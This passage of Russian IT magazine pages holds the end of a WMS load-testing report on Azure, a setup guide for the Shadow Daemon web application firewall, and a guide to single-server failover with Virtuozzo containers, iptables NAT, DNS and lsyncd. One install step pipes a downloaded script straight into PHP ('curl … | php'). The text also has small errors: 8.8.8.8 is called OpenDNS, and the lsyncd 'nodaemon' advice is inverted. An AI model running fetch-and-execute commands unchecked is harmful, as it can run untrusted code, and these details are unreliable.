работал практически без эксцессов (на самом деле в консоли в живом режи-
ме было видно, что боты генерируют огромное количество ошибок, но все они
никак не влияли на выполнение их задачи, потому что в основном были связа-
ны с ошибками исполнения Java-скриптов веб-оболочки).
  Сам по себе Controller поразил жутким интерфейсом добавления ботов
(плохо работает с ботами, расположенными в разных папках, каждого бота
приходится добавлять руками вместо пакетной обработки, нельзя создать со-
рок уникальных ботов в один клик, приходилось каждому вручную назначать
соответствующий скрипт), но зато он на выходе дает очень подробную и удоб-
ную статистику, которую можно экспортировать не только во встроенный ана-
лизатор, но и в Excel и в XML для изучения.


                                                              Connections per second





                                                                     Hits per second





                                                  HTTP responses per
                                                           second





                                                                 Transactions per second





После отработки сценария в тестовой среде файлы сценария и скрипты ботов
были перенесены в Azure, где уже был развернут LoadRunner. На что мы ре-
комендовали бы обращать внимание при записи скриптов для тестирования
сценариев Web HTTP/HTML — это на параметр Think Time. Это время, в тече-
ние которого живой посетитель странички читает ее содержимое, прежде чем
нажать следующую кнопку или ссылку. Без этого параметра боты бездумно
щелкают ссылку за ссылкой, не дожидаясь загрузки следующей станицы, пы-
таются кликнуть ссылки на ней, естественно, не находят нужный элемент и от-
валиваются с ошибкой. Плюс web-сервер, естественно, воспринимает такое
поведение как флуд и блокирует подключение.

РЕЗУЛЬТАТЫ ТЕСТИРОВАНИЯ
— Итак, покупаем ее?
— Нет, мне нужна другая машина.
— Какая же?
— Электронный калькулятор — он будет работать за тро-
их бухгалтеров и в три раза быстрее.

Укрощение строптивого (Il Bisbetico domato)

Как говорилось выше, одно из сомнений в производительности Windows Azure
основывалось на том, что среда shared и можно было оказаться соседом ка-
кой-нибудь прожорливой виртуальной машины другого клиента MS. Вдобавок
в зависимости от времени дня нагрузка на системы так или иначе возрастает:
люди просыпаются, приходят на работу, окунаются в рутину повседневности,
наполненную графиками, таблицами, отчетами и презентациями для началь-
ства, электронными письмами, звонками и чатами в Skype for Business. Для них
это «отчет медленно строится», а для нас — «серверу не хватает ресурсов»...
   Для чистоты эксперимента было решено запустить тесты несколько раз
в день в разное, предположительно пиковое время (10:00–12:00) для раз-
личных европейских часовых поясов. Параллельно в Azure была включена за-
пись базовых, сетевых, SQL-метрик и журнал IIS. Первое, что хочу отметить
по итогам тестов: большого разброса в показателях не было. То есть с одними
и теми же операциями в разное время дня виртуалки справлялись примерно
одинаково.

День первый
Инфраструктура «Эконом-вариант»:
•  1xA0 Basic (DC, Print Server)
•  2xA3 Basic (SQL Server / Application Server + RDS / Client Access Server)

На RDS-сервере ничего особо интересного не происходило, 40 VUser’ов по-
делили между собой примерно 6 Гбайт оперативной памяти и примерно 80%
производительности CPU. Основной подопытный у нас был SQL/App-сервер.
   Вкратце — за каждый запуск теста было выполнено следующее:
1. Принято 15 поставок товара примерно на 270 позиций в общей сложности.
2. Создано и завершено порядка 540 заданий на размещение товара (это ког-
   да палету пересчитывают, обматывают стретч-пленкой и ставят в стеллаж
   для хранения, при этом в систему вносится информация о товаре на каждой
   конкретной палете и точном адресе ее расположения на складе).
3. Создано 140 заказов по 10 линий.
4. Создано и завершено 190 заданий на подбор товара.
5. Упаковано (пересчитано и подготовлено к отгрузке) и отгружено 190 заказов.

Среднее время завершения теста — 1 час 15 минут.
   Графики производительности можно увидеть на соответствующих изобра-
жениях.

Процессор:

                                                        Производительность
                                                         процессора в варианте
                                                      «Эконом»





Основные скачки нагрузки наблюдались на операциях приемки и размещения то-
вара, так как прежде, чем сказать, куда размещать каждую конкретную палету, си-
стема анализирует размерно-весовые характеристики и количество товара на ней,
сроки годности, правила отгрузки и еще несколько условий. Это один из самых
сложных процессов с точки зрения как логики, так и настройки и обработки.

RAM:

                                                       Использование RAM
                                                          в варианте «Эконом»





Наблюдаются примерно такие же скачки.

HDD:

                                                         Загруженность HDD
                                                          в варианте «Эконом»





Ну и гвоздь программы, то, ради чего все это затеялось, — встречайте: ДИСК!
Возможно, из-за того, что система в целом не спешила читать и писать дан-
ные, запись на диск колебалась в районе 5–10 Мбайт/с. При этом никаких
проблем на стороне SQL не наблюдалось абсолютно. Ни тебе ошибок бло-
кировки записей, ни тебе большой очереди. Ровным счетом ничего, обычная
плавная работа.
   Касательно скачков при чтении: первый, самый сильный и самый продол-
жительный, происходил в момент так называемого запуска волны — процес-
са, при котором система анализирует поступившие заказы на отгрузку и гене-
рирует задания на подбор, содержащие инструкции для операторов склада
о том, какой товар, где, сколько и в какой последовательности брать. Даль-
ше сами процессы подбора, упаковки и закрытия заказов тоже ознаменованы
характерными скачками объемов считываемой информации, но вызвано это
только тем, что все боты выполняли эти задачи практически одновременно.
В реальной жизни такие ситуации почти невозможны.



                           Продолжение статьи
SYNACK


     Начало статьи
ВЫБИРАЕМ
WMS-СИСТЕМУ И ЕЕ
ТЕХОБЕСПЕЧЕНИЕ
          WMI, SCALE ИЛИ WMOS?
         ЦОД ИЛИ ОБЛАКО?





День второй
Инфраструктура Performance:
•  1xA0 Basic (DC, Print Server)
•  1xA3 Basic (RDS / Client Access Server)
•  1xD3_v2 (SQL Server / Application Server)

Сказать по правде, после первого прохода теста мы подумали, что «что-то по-
шло не так». Боты перестали работать через 35 минут после запуска. Стали ис-
кать ошибку, пошли по каждому шагу — ан нет, все выполнено. Последующие
пять запусков показали примерно такие же результаты. Графики производи-
тельности можно увидеть на соответствующих изображениях.

Процессор:

                                                        Производительность
                                                         процессора в варианте
                                                          Performance





Все спокойно и без критических всплесков.

RAM:

                                                       Использование
                                           RAM в варианте
                                                          Performance





Эта «мадам» была крайне невозмутима, ей вообще было все равно. Практиче-
ски никаких эмоций.

HDD:

                                                         Загруженность
                                              HDD в варианте
                                                          Performance





А вот диск понервничал. Вот тут для меня остается загадкой, почему при запу-
ске волны скачок был только до 10 Мбайт/с, а запись только в редких случаях
спустилась ниже 10.
   Как бы то ни было, результаты двух дней тестов нас более чем удовлетвори-
ли. Для понимания: один прогон виртуальных пользователей эмулировал объ-
ем работы нашего склада примерно за два дня в средний сезон. В этот момент
мы жалели только о том, что коробки физически остаются на месте :).
SYNACK





                                                                              Мартин
                                                                                                            «urban.prankster»
                                                                                  Пранкевич
                                                                                               prank.urban@gmail.com





                      ИЗУЧАЕМ
                    ВОЗМОЖНОСТИ
                     НОВОГО WAF
                     SHADOW DAEMONБРОНЯ
ДЛЯ САЙТОВ





Веб-приложения, отличающиеся разнообразием и вы-
сокой интерактивностью, сегодня представляют собой
большую проблему безопасности. Ведь по статисти-
ке большинство современных атак направлены именно
на веб-сервисы, и привычные инструменты, работаю-
щие на сетевом уровне, их не могут остановить. Поэтому
специальные решения, позволяющие защитить веб-сай-
ты, востребованы как никогда. Для небольших проектов
коммерческие решения обычно чересчур дорогое удо-
вольствие, поэтому появление очередного open source
WAF само по себе событие.


ПРОЕКТ SHADOW DAEMON
Очевидно, лучше всего защищаться от атак на веб-приложения правильно напи-
санным кодом, но даже в тех проектах, где уделяют серьезное внимание тести-
рованию, постоянно находят и будут находить уязвимости. Модули, написанные
сторонними разработчиками, вообще потенциальная брешь в безопасности.
Не секрет, что ошибки обнаруживают даже в аддонах, предназначенных для за-
щиты сайтов. Повышая безопасность, они сами оказываются проблемой. В этом
случае WAF (Web Application Firewall) становится чуть ли не единственным пре-
пятствием, не позволяющим хакеру выполнить свои действия.
   Shadow Daemon — это небольшое приложение, которое обеспечивает без-
опасность веб-сервисов, перехватывает запросы, отфильтровывает вредонос-
ные параметры и протоколирует все события. Написан Хендриком Бухвальдом
(Hendrik Buchwald) как университетский проект и в настоящее время служит не-
плохой заменой коммерческим WAF, особенно для небольших проектов. Вер-
сия 1.0 была представлена в январе 2015-го, сегодня уже доступна версия 2.
  SD прост и не требует особых навыков, хотя, конечно, при их наличии можно
легко адаптировать его под любые условия. Идея состоит в том, что система
настроена не на конкретные уязвимости в конкретном приложении, а на уяз-
вимые места в общем: SQL-команды в запросе, параметры HTML/JavaScript,
используемые в XSS, аномальные параметры в массивах и так далее. В отли-
чие от многих других брандмауэров веб-приложений Shadow Daemon не бло-
кирует вредоносные запросы. Вместо этого он только отфильтровывает опас-
ные части и позволяет запросу выполняться дальше. Это делает невозможным
проникновение, но вводит в заблуждение атакующего. Для точного обнаруже-
ния запросов используются белый и черный списки, которые администратор
может редактировать под свои условия.
  В черном списке при помощи регулярных выражений производится поиск
известных атак во входных данных. Каждый фильтр имеет вес, задающий некое
значение неблагонадежности запроса. Значение всех фильтров суммируется
и сравнивается с пороговым значением. Если показатель запроса больше, чем
установленный порог, запрос классифицируется как угроза. Черный список
хотя и обнаруживает большинство алгоритмов атак, но не гарантирует полную
безопасность. Всегда есть вероятность, что будет подобран запрос, который
пройдет фильтры. Черные списки обязательно должны быть включены.
   Белый список определяет, как должны выглядеть нормальные входящие
данные. Если под запрос не найдется соответствующее правило, он будет от-
несен к угрозе. Если правило найдено, алгоритм проверяет набор символов,
придерживается ли запрос ограничения длины. Это позволяет обнаружить лю-
бую атаку с достаточно низким порогом ложных срабатываний.
   Третий компонент — алгоритм целостности  (integrity), сверяющий кон-
трольную сумму запроса и правила при наличии правила в белом списке (если
его нет, то запрос однозначно рассматривается как угроза). Словарь хешей
содержит алгоритмы и соответствующие им значения исполняемого файла
сценария. Белый список и integrity можно первое время не использовать, что-
бы убедиться, что все работает нормально.
  Shadow Daemon построен по модульному принципу, когда подсистема за-
хвата (connector), анализа (демон shadowd) и интерфейс разделены для луч-
шей гибкости, расширяемости и обеспечения безопасности. Необязательный
веб-интерфейс позволяет исследовать атаки в мельчайших подробностях.
В комплект входят скрипты, которые могут быть использованы для отправки
отчетов по электронной почте и ротации журналов. Если нужно просто защи-
тить сайт, не вникая в детали и не подстраивая работу Shadow Daemon, то ин-
терфейс можно не ставить.
   Коннектор «подключается» к интерпретатору и перехватывает соединение
между веб-сервером и приложением и передает по TCP (в JSON-формате) де-
мону shadowd IP, идентификаторы ввода/пути, входные данные, хеш и прочую
информацию. В ответ получает один из шести статусов от OK: 1 до CRITICAL_
ATTACK: 6 и массив идентификаторов входа. На данный момент доступны кон-
некторы, обеспечивающие работу с приложениями, написанными на PHP, Perl
и Python, планируется добавление других языков.
   Веб-приложения могут отличаться по настройкам, и общие правила мо-
гут не подходить для всех. Поэтому в SD реализованы профили, позволяющие
указать специфические для каждого хоста установки. В общем, лучше исполь-
зовать профиль для каждого приложения.





                                        Управление профилями в Shadow Daemon


УСТАНОВКА SHADOW DAEMON
Для установки демона shadowd проект предлагает исходные тексты и пакеты
для Debian/Ubuntu и Red Hat / CentOS. Для Ubuntu доступен и репозиторий.
Кроме того, можно использовать образ Docker, в этом случае получаем сразу
полностью настроенную и готовую к работе систему.

$ sudo add-apt-repository ppa:zit-hb/shadowd
$ sudo apt-get update
$ sudo apt-get install shadowd

Переходим к настройке базы данных. В настоящее время поддерживается
PostgreSQL или MySQL. В /usr/share/shadowd лежат шаблоны, нужно только
выбрать и импортировать подходящий. Импортируем шаблон для MySQL:

$ mysql -uroot -p
> CREATE DATABASE shadowd;
> USE shadowd;
> GRANT ALL PRIVILEGES ON shadowd.* to 'shadowd'@'localhost'
    IDENTIFIED BY 'password';
> FLUSH PRIVILEGES;
> source /usr/share/shadowd/mysql_layout.sql;

Все настройки shadowd прописаны в конфигурационном файле /etc/shadowd/
shadowd.ini. Файл в общем несложный, и практически все параметры проком-
ментированы; кроме подключения к базе данных, можно оставить как есть:





                                                      Редактируем shadowd.ini

Перезапускаем сервис:

$ sudo service shadowd restart

Проверяем:

$ sudo netstat -tpln | grep shadowd
tcp    0    0 127.0.0.1:9115    0.0.0.0:*    LISTEN    3094/shadowd

Ставим коннектор для PHP.

$ git clone https://github.com/zecure/shadowd_php.git

Настраиваем коннектор для PHP, чтобы Shadow Daemon начал защищать си-
стему. Ничего компилировать не нужно, просто копируем содержимое src
в любое удобное место, но надо убедиться, что веб-сервер может прочитать
файлы.

$ sudo mkdir /usr/share/shadowd/php
$ sudo cp -Rv shadowd_php/src/* /usr/share/shadowd/php

Теперь следует сообщить PHP о новом скрипте. В зависимости от ситуации
это можно сделать несколькими способами. Если защита нужна для всех сай-
тов, то прописываем в php.ini:

auto_prepend_file /usr/share/shadowd/Connector.php

Если защищать будем отдельный хост, то пишем в настройках виртуального
хоста Apache или .htaccess:

php_value auto_prepend_file "/usr/share/shadowd/php/Connector.php"

Для nginx настройка в виртуальном хосте чуть другая:

fastcgi_param PHP_ADMIN_VALUE "auto_prepend_file=/usr/share/shadowd/
    php/Connector.php";

Копируем конфигурационный файл для коннектора.

$ sudo cp -v shadowd_php/misc/examples/connectors.ini /etc/shadowd/
    connectors.ini

Файл хорошо прокомментирован, и некоторые установки говорят сами
за себя, более подробное описание есть в документации. Параметры, по-
меченные как Required, следует отредактировать обязательно. Файл должен
быть доступен для чтения пользователем веб-сервера, иначе сайт перестанет
работать. Также возможно использование нескольких файлов с разными на-
стройками для защиты специфических приложений. Нужный файл можно ука-
зать в переменной SHADOWD_CONNECTOR_CONFIG.





                                                        Настройки коннектора

УСТАНОВКА ВЕБ-ИНТЕРФЕЙСА
Веб-интерфейс доступен только в Git, для его работы понадобится веб-сер-
вер, поддерживающий PHP. Для Apache, nginx и lighttpd на сайте проекта до-
ступны правила rewrite.

$ cd /var/www
$ sudo git clone https://github.com/zecure/shadowd_ui.git

Настраиваем виртуальный хост на корневой каталог /var/www/shadowd_ui/
web. Настройки стандартные, приводить их не буду. Для Apache там уже есть
подготовленный .htaccess, нужно просто его разрешить.




Веб-интерфейс написан с использованием PHP-фреймворка Symfony 2, раз-
работчики приготовили пакет, позволяющий скачать все нужное при помощи
менеджера зависимостей Composer.

$ cd /var/www/shadowd_ui
$ curl -s https://getcomposer.org/installer | php
$ php composer.phar install

Программа запросит, какие будем использовать драйверы базы данных. Зна-
чение по умолчанию pdo_pgsql для PostgreSQL; так как мы используем MySQL,
пишем pdo_Mysql. И устанавливаем остальные параметры для подключения
к базе данных. Для того чтобы проверить настройки, можно набрать в браузе-
ре http://localhost/config.php.
   Добавляем нового администратора:

$ php app/console swd:register --env=prod --admin --name=admin
    —email=null@example.org

Email необязателен и используется пока только для отправки отчетов. Реги-
стрируемся в веб-админке. Первым делом нужно создать профиль. Перехо-
дим в Management –> Profiles, нажимаем Add и заполняем параметры. Зна-
чения по умолчанию вполне подходят для большинства случаев. Необходимо
указать IP коннектора, добавить имя профиля, в качестве шаблона можно ис-
пользовать звездочку. И вводим ключ для авторизации запросов. Включаем
черный список и при необходимости белый и проверку целостности. В тесто-
вый период, пока нет уверенности, что система работает правильно, можно
установить пассивный режим в поле Mode. В Global threshold прописываем по-
рог срабатывания. Оптимальное значение находится в пределах между 5 и 10.
Лучше начать с наименьшего значения, поэтому ставим 5. В остальных вклад-
ках можно просмотреть правила и оценить запросы и параметры. Фильтры
и поиск позволяют быстро отобрать нужные.





                                                 Веб-интерфейс Shadow Daemon





                                   Анализ запросов в интерфейсе Shadow Daemon





                                                          Настройка Black List

Open source WAF — выбирать не из чего

Запрос open source WAF выдаст не так много проектов: ModSecurity, IronBee,
openWAF, NAXSI, WebKnight и Shadow Daemon. Но на поверку окажется, что их
и того меньше. О ModSecurity сказано много, поэтому пару слов об остальных
проектах.
   IronBee и openWAF, пышно анонсированные в 2011 году, уже не разви-
ваются. Проект WebKnight от AQTRONIX представляет собой ISAPI (Internet
Server API) — фильтр, который защищает веб-сервер, блокируя определен-
ные запросы на основе правил фильтрации, установленных администратором.
Как и в случае Shadow Daemon, правила представляют собой не сигнатуры,
а некие фильтры безопасности, обнаруживающие основные типы атак: пере-
полнение буфера, инъекции SQL, CSRF, подстановку JavaScript-блоков и дру-
гие атаки. Использование ISAPI позволяет проверять SSL-трафик. Поддержка
ISAPI есть в IIS, Apache (mod_isapi) и Zeus Web Server. Совместим с некоторы-
ми популярными веб-приложениями: Frontpage, WebDAV, Flash, Cold Fusion,
Outlook Mobile / Web Access, SharePoint и другими.
   NAXSI (nginx anti XSS & SQL injection) — это WAF для nginx, проверяющий
GET- и POST-запросы, а также заголовки HTTP при помощи достаточно про-
стого (по умолчанию) набора правил, запрещающего опасные символы и клю-
чевые слова, используемые в SQL. Таким образом, он помогает защитить веб-
сайт от XSS, SQL-инъекций, CSRF, Local/Remote file inclusions и других атак.
Хотя набор в некоторых случаях может помешать корректной работе сайта,
и необходимо корректировать правила при помощи белого списка, разреша-
ющего игнорировать запрещенные комбинации в некоторых контекстах. Обу-
чающий режим и специальные утилиты nxapi/nxtool позволяют легко сформи-
ровать такой список. Пакет есть в репозиториях большинства дистрибутивов
(в Ubuntu nginx-naxsi), поэтому его установка, настройка и внедрение обычно
дело не очень сложное.


ВЫВОД
Конечно, Shadow Daemon, повышая безопасность, для анализа данных по-
требует некоторого количества ресурсов. Нагрузочное тестирование пока-
зало, что примерно на 5–10% увеличивается время запроса. Для небольших
VDS это может быть уже проблемой. Поэтому, если решено внедрять Shadow
Daemon, нужно однозначно иметь запас мощности.
UNIXOID
ОТКАЗО-
УСТОЙЧИВЫЕ
ВЕБ-СЕРВЕРЫ




СТРОИМ МОГУЧЕЕ РЕШЕНИЕ
НА БАЗЕ НАСЛЕДНИКА OPENVZ





Денис Колисниченко
  dhsilabs@gmail.com





Допустим, у нас есть один физический довольно мощный сервер. Конкретные
характеристики приводить не буду, представим, что это современный сервер
со средними или чуть выше средних параметрами. Ты хочешь его использо-
вать в качестве веб-сервера для своего сайта, но в то же время нужно обеспе-
чить его отказоустойчивость, а физический сервер всего один.
   Классическая схема отказоустойчивости реализуется при наличии хотя бы
двух физических серверов. Один — основной, второй — резервный. Понятно,
что если что-то происходит с основным, то в дело вступает резервный. В нашем
случае, поскольку нет второго физического сервера, мы будем использовать
два виртуальных. Расчет довольно прост: если произойдет какой-то программ-
ный глюк на основном виртуальном сервере, то будет работать резервный.
   Недостаток такого вида отказоустойчивости в том, что если что-то случится
с железом, то тебе уже ничто не поможет. Но, как говорится, это лучше, чем
ничего. К тому же приведенные в статье инструкции ты сможешь использовать
для настройки полноценной отказоустойчивости, когда у тебя появится второй
физический сервер.

ВЫБОР РЕШЕНИЯ ВИРТУАЛИЗАЦИИ
Какое решение будем использовать для виртуализации? Первое, что приходит
на ум, — это старый добрый OpenVZ. Добрый-то он добрый, но уж очень ста-
рый, я бы даже сказал — древний, а его ядро вообще родом из мезозойской
эры. Другими словами, если у тебя современный дистр, то, установив OpenVZ,
ты сделаешь эдакий downgrade. Но выход есть: наследник OpenVZ — Virtuozzo.
   Преимущество Virtuozzo в том, что устанавливается он на голое железо
и представляет собой отдельный дистрибутив Linux (Virtuozzo Linux), который
уже оптимизирован для задач виртуализации и хостинга. Все, что нужно, —
взять и установить его на машину, которая будет сервером виртуализации.
   Недостаток в том, что Virtuozzo — решение коммерческое и придется не-
много потратиться. Дополнительную информацию ты сможешь найти на офи-
циальной страничке продукта.

Получение trial-версии

Прежде чем покупать Virtuozzo, ты можешь его попробовать, чтобы оконча-
тельно решить, понравится он тебе или нет. Заходи на их сайт и жми кнопку
Try Virtuozzo 7 Now. Далее нужно заполнить несложную форму и нажать кноп-
ку Submit. После этого ты попадешь на страничку, на которой можно скачать
ISO-шник и документацию. Линк на ISO-шник и документацию также будет про-
дублирован на твой email, если ты захочешь скачать Virtuozzo и/или документа-
цию позже.

                                                         Форма акти-
                                                             вации твоей
                                                                           trial-версии





Триальная лицензия дается во время установки Virtuozzo 7 на хост, поэтому
важно наличие интернет-соединения. Trial-версия работает 30 дней — думаю,
этого вполне достаточно, чтобы принять решение о покупке.


СОЗДАНИЕ ВИРТУАЛЬНЫХ СЕРВЕРОВ
Нам нужно создать два контейнера (естественно, после установки Virtuozzo
Linux на физический компьютер), а затем установить в них все самое необхо-
димое. Сначала создадим сами контейнеры:

# prlctl create first --vmtype ct --ostemplate centos-6-x86_64
# prlctl create second --vmtype ct --ostemplate centos-6-x86_64





                                                        Рис. 1. Создание контейнеров

Как ты уже догадался, это будут контейнеры для первого и второго серверов.
После создания контейнеров нужно их настроить:

# prlctl set <контейнер> --cpus 1
# prlctl set <контейнер> --memsize 1G --swappages 512M
# prlctl set first --hostname first.example.com
# prlctl set first --ipadd 192.168.52.101
# prlctl set second --hostname second.example.com
# prlctl set second --ipadd 192.168.52.102





                                                       Рис. 2. Настройка контейнеров

Здесь нужно ввести актуальные параметры. Я выделил каждому виртуально-
му серверу по одному процессору и гигабайту оперативки, своп — 512 Мбайт
(на всякий случай). Можно было бы выделить и 512 Мбайт оперативки — боль-
шинство сайтов работают на виртуальном хостинге с худшими характеристи-
ками. Также доменные имена и IP-адреса нужно указать собственные, у меня
демонстрационные.
   Запускаем виртуальный сервер:

# prlctl start <контейнер>

Устанавливаем пароль root для обоих контейнеров:

# prlctl exec <контейнер> passwd

Подключаемся к серверу по SSH:

# ssh <IP-адрес>

По сути, на данный момент у тебя уже есть два полноценных сервера, которые
осталось только настроить.





       Рис. 3. Запуск виртуального сервера, изменение пароля root и подключение по SSH


НАСТРОЙКА СЕТИ
Прежде чем приступить к настройке серверов, нужно настроить сетку, иначе
в виртуальном сервере yum работать не будет и софт ты все равно не уста-
новишь. На данный момент мы установили только доменные имена и IP-адре-
са виртуальных узлов. Но этого мало. Нужно настроить NAT, разрешить доступ
к виртуальным серверам извне и настроить DNS.
   Начнем с настройки NAT. В Virtuozzo Linux пакет iptables-services установ-
лен по умолчанию, а IPv4-форвардинг включен (в файле cat /proc/sys/net/
ipv4/ip_forward есть единичка), поэтому никакие подготовительные дей-
ствия не понадобятся: сразу приступаем к настройке правил iptables. Для NAT
определенного контейнера используется команда

# iptables -t nat -A POSTROUTING -s src_net -o if -j SNAT
    --to ip_address

Здесь вместо src_net нужно указать IP-адрес подсетки контейнера, вместо
if — интерфейс, а вместо ip_address — внешний IP-адрес твоего аппарат-
ного узла. Но можно сделать проще и ввести команду

# iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE

Ошибка?

Если система будет ругаться на отсутствие таблицы NAT, не обращай внима-
ния. Видимо, есть какой-то конфликт между версией iptables и ядра, разби-
раться не стал, но самое интересное, что правила работают :).


В этом случае все IP-адреса будут транслироваться SNAT. Именно эту коман-
ду я и ввел на рис. 4.





                     Рис. 4. Включение NAT. Установка сервера DNS для первого сервера

На радостях запускаем контейнер  и... обнаруживаем, что пропинговать-то
узел по IP мы можем, а вот DNS настроить забыли. Ничего, все это решается
командой

# prlctl set <контейнер> --nameserver 8.8.8.8

Пока используем OpenDNS, ведь свой мы еще не настроили. Теперь нужно
убедиться, что мы можем пропинговать узел по его имени:

# ping mail.ru





                               Рис. 5. Сетка на виртуальном сервере поднята и работает

Вот, теперь все в порядке и можно приступить к установке софта. Только не за-
будь настроить доступ к виртуальным серверам извне, иначе никто не сможет
к ним достучаться:

# iptables -t nat -A PREROUTING -p tcp -d ip_address
    --dport port_num -i ens33 -j DNAT --to-destination
    ve_address:dst_port_num

Здесь ve_address — это IP-адрес контейнера, dst_port — TCP-порт, ip_
address — внешний (публичный) IP-адрес твоего узла, а port_num — TCP-
порт аппаратного узла, который будет использоваться для интернет-соедине-
ний к приватным контейнерам. Обрати внимание, что данное правило сделает
сервис, который раньше висел на порту с заданным номером (port_num), не-
доступным. Также обрати внимание, что трансляция SNAT, которую мы делали
раньше, тоже необходима.
   Если ты хочешь, чтобы порт 80 был доступен на аппаратном узле, а доступ
к виртуальным серверам реализован через порт 8080, используй такие правила:

# iptables -t nat -A PREROUTING -p tcp -d ip_address --dport 8080
    -i eth0 -j DNAT --to-destination ve_address:80
# iptables -t nat -A POSTROUTING -s ve_address -o eth0 -j SNAT
    --to ip_address

Тогда  «достучаться»  до  виртуальных  серверов  можно  будет   так:
http://ip_address:8080/.
   Осталось только сохранить правила iptables:

# service iptables save
# service iptables restart

Теперь у наших виртуальных серверов есть доступ к интернету, они могут про-
пинговать друг друга и к ним можно обратиться извне (рис. 6, 7). По сути, они
мало чем отличаются от обычных интернет-серверов.





                       Рис. 6. Пинг с сервера second (адрес *102) сервера first (адрес *101)





        Рис. 7. Заходим извне (прямое обращение по IP-адресу) на сервер first (адрес *101)

НАСТРОЙКА DNS
Далее нужно установить на физический компьютер пакет bind — это DNS-сер-
вер. Пакет хоть и имеет версию 9, но называется просто bind. Каталог /etc/
bind отсутствует (вместо него — каталог /etc/named, но он пуст), а конфиг
самого сервера находится в /etc/named.conf. Это я описываю отличия на-
стройки пакета bind в Virtuozzo Linux от привычных дистрибутивов. Во всем
остальном bind настраивается так же, как в любом другом дистрибутиве Linux.
   Твоя цель — создать две A-записи на www.example.com в зоне example.
com:

@       IN      A       192.168.52.101
www     IN      A       192.168.52.101
www     IN      A       192.168.52.102
first   IN   A   192.168.52.101
second  IN  A   192.168.52.102

Полные конфиги не стану приводить по двум причинам. Первая — все они
стандартны и только будут занимать место (да и Google не любит дублиро-
вание контента :)). Вторая — все равно у тебя будет реальная зона, у меня
же она демонстрационная. Если ты повторяешь все написанное в статье
в VMware/Windows (то есть «физический» сервер с Virtuozzo Linux — это вир-
туальная машина VMware), то можно для обеспечения отказоустойчивости до-
бавить в C:\Windows\System32\drivers\etc\hosts строки

192.168.52.101 www.example.com
192.168.52.102 www.example.com

Это тоже две A-записи, но только в Windows. После этого введи команду
ipconfig /flushdns.
  В Linux проверить наш сценарий также можно без DNS-сервера — отре-
дактировав файл /etc/hosts и добавив в него те же записи. Но на практике
тебе будет нужен DNS-сервер, делегирующий твой домен. Так что управление
доменом придется перетащить к себе или же к регистратору, где есть вменя-
емая панель управления зоной — с возможностью добавления необходимых
тебе записей.

ПРОВЕРКА ОТКАЗОУСТОЙЧИВОСТИ
Для начала расскажу, почему все это будет работать. Современные браузеры,
получив несколько A-записей, пытаются зайти на сайт, используя первый IP-а-
дрес. Если он недоступен, они используют второй и так далее. Другими сло-
вами, таких вот серверов у тебя может быть даже не два, а гораздо больше.
Например, у Google их одиннадцать, а у Mail.Ru — четыре (рис. 8).





                                          Рис. 8. Для google.com используется один-
                                       надцать А-записей, для mail.ru — четыре


Чтобы проверить отказоустойчивость, нам нужно сделать разным контент
на первом и втором серверах. Ведь сейчас открывается одна и та же стра-
ничка (Apache 2 Test Page), и мы просто-напросто не будем знать, с какого
сервера получен ответ. Поэтому, чтобы не использовать дополнительные ин-
струменты для отслеживания пакетов, проще всего зайти на второй сервер
и отредактировать файл /var/www/html/index.html. Пусть его содержимое
будет вот таким простым:

<h1>Second server</h1>

После этого нужно остановить первый сервер и обратиться к www.example.
com. Но обо всем по порядку:

ssh 192.168.52.102
[root@second]: echo "<h1>Second server</h1>" > /var/www/html/
    index.html
[root@second]: exit
prlctl stop first

Первая команда обеспечивает вход на второй сервер. Вторую мы уже вводим
в SSH-сеансе со вторым сервером. Она добавляет «контент» в index.html. За-
тем мы выходим со второго сервера и останавливаем первый.





                                                    Рис. 9. Первый сервер остановлен

Осталось открыть твой любимый браузер и ввести URL http://www.example.com.
У тебя должна появиться страничка с надписью Second server (рис. 10). Если
ты увидел тестовую страничку Apache, то что-то ты сделал не так. Копать нужно
в сторону DNS (ну или ты забыл снести тестовый контент на втором сервере).





                                                 Рис. 10. Отказоустойчивость работает

НАСТРОЙКА СИНХРОНИЗАЦИИ
По сути, поставленная задача, а именно отказоустойчивость работает. Но нам
нужно еще настроить синхронизацию контента, чтобы все работало как следует.
   Если у тебя только HTML-контент или же движок, который хранит данные
в файлах, то все очень просто. Достаточно только настроить синхронизацию
каталогов двух веб-серверов (кстати, сами серверы httpd на виртуальных сер-
верах оказались уже установленными — очень удобно). Если же контент хра-
нится в базе данных MySQL или какой-либо другой, то нужно настраивать
репликацию БД, однако это тема для отдельной статьи. Поэтому есть два вы-
хода — или разбираться с репликацией MySQL, или писать сценарий на PHP,
который будет делать импорт/экспорт БД на второй сервер. Как по мне, про-
ще и эффективнее использовать уже существующие механизмы репликации,
а не изобретать велосипед заново.

Ссылка

Основы репликации MySQL


Сейчас мы рассмотрим, как синхронизировать HTML-контент. На обоих сер-
верах нужно установить lsyncd (если не требуется двусторонняя синхрониза-
ция, то достаточно установить пакет только на первом):

rpm -ivh http://mirror.yandex.ru/epel/7/x86_64/e/epel-release-7-5.
noarch.rpm
yum install lsyncd

Первая команда добавляет нужный репозиторий, вторая устанавливает lsyncd.
Эти команды надо вводить на всех виртуальных серверах. При создании вирту-
альных серверов я использовал шаблоны CentOS. Если ты выбрал Debian-со-
вместимый шаблон, то для установки lsyncd используй apt-get:

# apt-get install lsyncd

Репозиторий подключать не требуется, если ты выбрал шаблон Ubuntu или
Debian начиная с версии 7. Там lsyncd уже находится в репозитории.
   После установки lsyncd нужно создать каталоги для хранения логов и вре-
менных файлов (создай эти каталоги на двух серверах, если в будущем пона-
добится двусторонняя синхронизация):

# mkdir -p /var/log/lsyncd
# mkdir -p /var/www/temp

Теперь отредактируем основной файл конфигурации первого сервера /etc/
lsyncd.conf:

settings {
   logfile    = "/var/log/lsyncd/lsyncd.log",
  statusFile = "/var/log/lsyncd/lsyncd.status",
  nodaemon   = true
}
sync {
  default.rsyncssh,
  source="/var/www/html",
  host="second.example.com",
  targetdir="/var/www/html",
  rsync = {
    archive=true,
    compress=true,
    temp_dir="/var/www/temp",
    update=true,
    links=true,
    times=true,
    protect_args=true
  },
  delay=5,
  ssh = {
    port = 22
  }
}

В host нужно указать второй сервер, в source — папку на текущем сервере
(она будет одинакова на обоих серверах), в targetdir — папку на удаленном
сервере. Параметр delay задает время синхронизации в секундах (значение
по умолчанию — 10 с). Параметр nodaemon после отладки следует установить
в true, чтобы lsyncd запускался в режиме демона.
   Перед проверкой надо создать SSH-ключи, поскольку lsyncd нужно, чтобы
был предоставлен доступ к каждому из серверов по ключу. На обоих серверах
введи команду

# ssh-keygen

На вопросы можно отвечать, просто нажав Enter. С сервера first добавляем
ключ сервера second:

# ssh-copy-id root@second.example.com

